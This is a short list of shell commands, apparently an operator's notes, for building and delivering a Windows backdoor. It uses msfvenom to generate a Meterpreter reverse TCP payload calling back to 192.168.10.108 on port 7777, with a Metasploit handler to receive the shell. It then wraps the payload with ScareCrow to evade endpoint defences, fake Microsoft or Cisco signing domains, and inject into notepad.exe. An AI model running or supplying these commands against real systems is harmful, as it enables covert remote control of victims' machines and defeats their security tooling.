```
./ScareCrow -I /path/to/your/payload.bin -etw -domain www.microsoft.com
./ScareCrow -I /path/to/your/payload.bin -sandbox -domain www.microsoft.com
./ScareCrow -I stageless.bin -domain www.microsoft.com -injection C:\\Windows\\System32\\notepad.exe


msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.10.108 lport=7777 -f raw -o hackerman.bin
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set lport 7777;set lhost 192.168.10.108;exploit -j"
ScareCrow_4.11_windows_amd64.exe -I C:\Users\Dylan\Desktop\test.bin -domain www.cisco.com -injection C:\\Windows\\System32\\notepad.exe
```
